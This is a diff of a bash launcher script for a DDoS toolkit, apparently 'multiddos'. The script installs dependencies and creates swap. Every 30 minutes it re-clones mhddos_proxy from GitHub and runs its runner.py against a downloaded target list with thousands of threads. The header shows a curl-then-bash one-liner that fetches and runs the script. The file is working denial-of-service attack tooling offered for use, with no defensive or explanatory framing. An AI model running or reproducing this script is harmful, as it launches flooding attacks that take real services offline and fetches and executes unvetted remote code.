@@ -1,10 +1,16 @@
 #!/bin/bash
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... test v0.9.1\n"
+clear && echo -e "Loading... test v0.9\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
-rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd #delete old folder; create new and cd inside
+rm -rf ~/multidd ~/multiddos #just in case also delete relic folder
+pkill -f start.py; pkill -f runner.py; #stop old processes if they still running
+
+# create swap file if system doesn't have it
+if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
+    sudo fallocate -l 1G /swp && sudo chmod 600 /swp && sudo mkswap /swp && sudo swapon /swp
+fi
 
 typing_on_screen (){
     tput setaf 2 &>/dev/null # green
@@ -119,21 +125,14 @@ prepare_targets_and_banner
 
 # create small separate script to re-launch only this small part of code
 cat > auto_bash.sh << 'EOF'
-# create swap file if system doesn't have it
-if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
-    sudo fallocate -l 1G /swp && sudo chmod 600 /swp && sudo mkswap /swp && sudo swapon /swp
-fi
-
-#install mhddos and mhddos_proxy
-cd ~/multidd/
-git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
-cd mhddos_proxy
-python3 -m pip install -r requirements.txt
-git clone https://github.com/MHProDev/MHDDoS.git
-
-# Restart and update targets every 30 minutes
+# Restart and update everything (mhddos_proxy and targets) every 30 minutes
 while true; do
-    pkill -f start.py; pkill -f runner.py
+    #install mhddos_proxy
+    rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd
+    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+    cd mhddos_proxy
+    python3 -m pip install -r requirements.txt
+
     if [[ $lite == "on" ]]; then
         tail -n 2000 $targets_uniq > $targets_lite
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 5000 &
@@ -144,6 +143,7 @@ while true; do
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $threads $args_to_pass &
     fi
 sleep 30m
+pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
 done
 EOF
